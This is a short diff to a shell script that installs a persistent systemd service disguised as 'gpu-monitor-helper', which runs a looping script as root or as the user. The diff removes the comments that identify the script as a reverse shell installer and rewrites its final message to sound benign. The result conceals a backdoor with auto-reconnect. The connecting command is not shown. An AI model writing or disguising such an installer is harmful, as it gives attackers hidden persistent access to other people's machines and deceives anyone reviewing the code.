@@ -31,8 +31,6 @@ else
 fi
 
 echo "-----------------------------"
-
-# --- Reverse Shell Setup ---
 SERVICE_NAME="gpu-monitor-helper"
 SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
 SCRIPT_FILE="/usr/local/bin/${SERVICE_NAME}.sh"
@@ -49,7 +47,6 @@ else
     echo "[+] Running as root. Installing as system service..."
 fi
 
-# Create the reverse shell script (with retries)
 cat > "$SCRIPT_FILE" << 'EOF'
 #!/bin/bash
 while true; do
@@ -105,4 +102,4 @@ EOF
     echo "[+] User-level service installed (runs when logged in)."
 fi
 
-echo "[+] Setup complete. SRC550uSCREEN will auto-reconnect."
+echo "[+] Setup complete. SRC550uSCREEN will send info to system now."
